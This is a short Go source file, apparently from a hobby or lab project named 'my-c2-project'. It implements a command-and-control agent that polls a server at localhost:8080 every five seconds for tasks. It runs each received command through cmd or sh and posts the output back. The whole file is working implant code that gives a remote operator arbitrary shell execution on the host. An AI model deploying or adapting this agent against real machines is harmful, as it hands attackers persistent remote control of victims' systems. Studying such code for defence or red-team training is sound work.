package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
    "os/exec"
    "runtime"
    "time"
    "my-c2-project/pkg/models"
)

func main() {
    agentID := "agent-001"
    server := "http://localhost:8080"

    for {
        // Poll for task
        resp, err := http.Get(fmt.Sprintf("%s/tasks/%s", server, agentID))
        if err == nil && resp.StatusCode == http.StatusOK {
            var t models.Task
            json.NewDecoder(resp.Body).Decode(&t)

            // Execute
            fmt.Printf("Executing: %s\n", t.Command)
            output := run(t.Command)

            // Return result
            t.Result = output
            t.Status = "completed"
            payload, _ := json.Marshal(t)
            http.Post(server+"/results", "application/json", bytes.NewBuffer(payload))
        }
        time.Sleep(5 * time.Second)
    }
}

func run(cmd string) string {
    var shell, flag string
    if runtime.GOOS == "windows" {
        shell, flag = "cmd", "/C"
    } else {
        shell, flag = "sh", "-c"
    }
    out, _ := exec.Command(shell, flag, cmd).CombinedOutput()
    return string(out)
}